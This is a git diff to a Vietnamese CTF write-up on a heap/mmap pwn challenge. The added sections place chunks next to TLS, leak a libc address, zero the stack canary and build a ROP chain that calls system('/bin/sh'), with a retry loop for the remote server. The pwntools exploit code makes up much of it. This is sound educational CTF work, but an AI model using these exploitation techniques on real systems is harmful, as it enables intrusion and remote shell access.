@@ -259,7 +259,10 @@ Một lí do nữa mình nghĩ đến `tls` đó là vì mình đã có kinh ngh
 
 Tuy nhiên vấn đề ở đây là maxsize ta có thể `mmap` là 0x2000, nhỏ hơn rất nhiều, và khi mình chạy thử thì nó cấp ở phân vùng nằm giữa ld chứ không phải ở trên `tls`. Tuy nhiên mình đoán là nếu ta `mmap` đủ số lần và lấp hết khoảng cách giữa 2 ld. Vùng nhớ tiếp theo cấp phát sẽ nằm ngay trên `tls` như ta cần.
 
-![image](https://user-images.githubusercontent.com/57558487/196604702-bb0f5610-1fa7-4251-92bf-fd48fc27ff1e.png)
+```python
+create(1, 0x2000, b'A\n')
+create(0, 0x2000, b'A\n')
+```
 
 Kết quả là: 
 
@@ -269,9 +272,157 @@ Ta có được một vùng nhớ với offset đến `$fs_base` là 0x4740, tuy
 
 ### Leaking and Fixxing bug
 
-Vì chúng ta cần leak một địa chỉ và `canary`, nên ở đây mình chọn 
+Vì chúng ta cần leak một địa chỉ và `canary`, nên ở đây mình chọn leak địa chỉ ở ngay vị trí `$fs_base` và đè qua `canary` để bypass. Tại ngay vị trí `$fs_base` có giá trị trả về chính nó, từ đây ta có thể tính toán được libc address. Như đã phân tích ở trên, ta cần thay `gSize[0] = 0x4070` chính xác để không bị gián đoạn bởi NULL byte.
 
-### Sync with server side
+Thử:
+
+```python
+create(1, 0x2000, b'A\n')
+create(0, 0x2000, b'A\n')
+
+show(0)
+create(0, 0x4740)
+edit(0, b'A' * 0x4740)
+show(0)
+
+s.recvuntil(b':\n')
+d = s.recvuntil(b'A' * 0x4740)
+
+leak = int.from_bytes(s.recv(6), byteorder = 'little', signed = False)
+log.info('Leak: 0x%x', leak)
+```
+
+Bùm, vả crash ....
+
+![image](https://user-images.githubusercontent.com/57558487/196610990-cb1f0d6f-dfe3-440e-a0cb-5f8e4527ac4b.png)
+
+Mình kì vọng nó sẽ in ra giá trị tại `$fs_base`, tuy nhiên chương trình lại crash, dùng gdb để kiểm tra, ta có thể thấy chương trình crash tại `__vfscanf_internal+75`, lí do crash là vì chương trình đã cố đọc giá trị tại vùng nhớ [0x4141414141414141], một vùng nhớ không tồn tại.
+
+-> Ok, dễ dàng nhận ra 0x4141414141414141 chính là chuỗi 'AAAAAAAA' ta đã đè vào đó, vậy tức là trong quá trình đè đến `$fs_base`, ta đã đè lên một vùng nhớ nào đó và khiến chương trình lỗi, ta cần xác định xem đâu là giá trị đầu tiên mà ta không thẻ overwrite trong khoảng cách từ mảng đến `$fs_base`.
+
+![image](https://user-images.githubusercontent.com/57558487/196612490-b173805e-f71c-4e3d-8485-7ac33008aa2a.png)
+
+Mình tiến hành dump và kiểm tra các giá trị ở gần phân vùng `$fs_base`, cuối cùng mình tìm thấy giá trị tại offset 0x46b0 chứa một địa chỉ nằm trong phần vùng `libc` -> ta có thể tính địa chỉ libc từ giá trị này.
+
+Chỉnh sửa lại payload một chút, điều chỉnh target thành offset 0x46b0, mình có thể leak thành công mà chương trình vẫn chạy bth -> it really good.
+
+```python
+create(1, 0x2000, b'A\n')
+create(0, 0x2000, b'A\n')
+
+show(0)
+create(0, 0x46b0)
+edit(0, b'A' * 0x46b0)
+show(0)
+
+s.recvuntil(b':\n')
+d = s.recvuntil(b'A' * 0x46b0)
+
+leak = int.from_bytes(s.recv(6), byteorder = 'little', signed = False)
+libc.address = leak - offset
+log.info('Leak: 0x%x', leak)
+log.info('Libc base: 0x%x', libc.address)
+```
+
+![image](https://user-images.githubusercontent.com/57558487/196613308-b0d90930-8efc-4c4c-b61c-2e6b8102353a.png)
+
+Vậy mình đã có thể leak được địa chỉ libc thành công, mình chỉ cần một bước cuối nữa là bypass `canary` để có thể tấn công, không thể leak được `canary` vì `printf` sẽ dừng lại tại NULL byte (offset 0x46b0), vì thế mình tiến hành đè qua `canary` bằng 0 để bypass.
+
+Rứt kinh nghiệm, trong quá trình đè mình sẽ cố gắng ít thay đổi nhất có thể để chương trình không bị crash. May mắn là tất cả các giá trị từ mảng đến `canary` đều có thể tính toán tương đổi dựa vào giá trị biến `leak` ta có được.
+
+```python
+create(0, 0x4770)
+
+payload = b'A' * 0x46b0 + p64(leak)
+
+val = [0x7dc0, 0, -0x5c0c0, -0x5bac0, -0x5b1c0] 
+val2 = [-0x21ce40, -0x21c420, -0x21ce40, 0, 0]
+
+for i in val:
+	if i:
+		payload += p64(leak + i)
+	else:
+		payload += p64(0)
+
+for i in range(12):
+	payload += p64(0)
+
+for i in val2:
+	if i:
+		payload += p64(leak + i)
+	else:
+		payload += p64(0)
+
+payload += p64(0) # overwrite canary
+
+assert(len(payload) == 0x4770)
+assert(b'\x20' not in payload)
+assert(b'\n' not in payload)
+
+edit(0, payload)
+```
+
+Okay, tiếp theo là tạo payload ROP bằng các gadget trong `libc` do đã tính toán được libc address
+
+```python
+rop = ROP(libc)
+
+pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+ret = rop.find_gadget(['ret']).address
+
+payload = b'1' + b'\x00' * 7 + p64(0) * 4 + p64(ret)
+payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
+payload += p64(libc.symbols['system'])
+s.sendlineafter(b'Your choice : ', payload)
+
+s.interactive()
+```
+
+Chạy thử và nó đã chạy thành công trên local.
+
+![image](https://user-images.githubusercontent.com/57558487/196614760-1061d1b9-b1b9-4d90-8db0-a60adcb435ca.png)
+
+### Edit payload to work with server side
+
+Khi giải thành công trên local thì mình hí hửng đem lên chạy server ngay. Nghĩ bụng là có được flag ngon cơm rồi. Tuy nhiên mình lại gặp thêm một rắc rối nữa.
+
+Số lượng `mmap(0x2000)` cần trước khi tạo được chunk nằm trước `tls` trên server là khác nhau. Mặc dù tác giả cho cả `libc` lẫn `ld`, vẫn có sự khác biệt khi chạy trên máy mình và chạy trên server. Trên máy mình cần tạo 2 chunk để có được offset như phía trên, trên server thì cần nhiều hơn. Lúc này mình lục lại đề và dùng docker ubuntu 22 chạy thử và tìm offset, tuy nhiên vẫn không chính xác, cuối cùng mình đã dùng một trick khác là brute đến khi nào đúng offset :)))
+
+Mình edit lại code như sau:
+
+```python
+t, n = 0, 1
+
+while True:
+	try: 
+		s = conn()
+
+		print(n)
+
+		for i in range(n):
+			create(10, 0x2000, b'A\n')
+		create(0, 0x2000, b'A\n')
+
+		if t == 3:
+			n += 1
+			t = 0
+		else:
+			t += 1
+
+		# exploit code
+
+		break
+
+	except KeyboardInterrupt:
+		s.close()
+		exit(0)
+	except:
+		s.close()
+
+s.interactive()
+```
+
+Vì điều kiện mạng khá tệ nên mình quyết định thử mỗi giá trị 3 lần, đến khi n == 3, thì server trả về thành công :)))
 
 ## Exploit
 
@@ -357,7 +508,7 @@ def dump(offset):
 		create(0, i)
 		edit(0, b'A' * 0x2000)
 
-for i in range(1):
+for i in range(3):
 	create(10, 0x2000, b'A\n')
 create(0, 0x2000, b'A\n')
 show(0)
